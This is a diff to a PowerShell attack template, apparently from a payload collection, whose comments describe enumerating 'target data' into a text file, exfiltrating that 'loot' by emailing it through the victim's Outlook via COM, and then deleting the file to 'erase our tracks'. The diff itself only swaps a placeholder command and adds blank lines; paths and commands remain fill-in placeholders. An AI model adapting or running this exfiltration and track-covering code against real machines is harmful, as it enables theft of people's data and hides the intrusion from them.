@@ -62,17 +62,19 @@ if ($outlook.Session.Accounts.Count -gt 0) {
 # ---------------------------------------------------------------------------------- #
 # Step 3: Enumerate the target data and redirect it to a text file                   #
 # ---------------------------------------------------------------------------------- #
+
 # Define the file path and name
 $filePath = "PATH\FILENAME.txt" # FILL OUT
 
 # Create a new text file
 New-Item -ItemType File -Path $filePath -Force
 
-COMMAND > "PATH\FILENAME.txt" # FILL OUT
+Write-Output "ENTER COMMANDS IN THIS BLOCK !" > "PATH\FILENAME.txt" # FILL OUT
 
 # ---------------------------------------------------------------------------------- #
 # Step 4: Exfiltrate the text file containing the loot using Outlook                 #
 # ---------------------------------------------------------------------------------- #
+
 $ATTACHMENT = "{PATH}\{FILENAME}.txt"
 $outlook = New-Object -comobject outlook.application
 $email = $outlook.CreateItem(0)
@@ -86,5 +88,6 @@ $outlook.Quit()
 # ---------------------------------------------------------------------------------- #
 # Step 5: Erase our tracks from the target machine                                   #
 # ---------------------------------------------------------------------------------- #
+
 del $HOME/FILENAME.txt
 exit
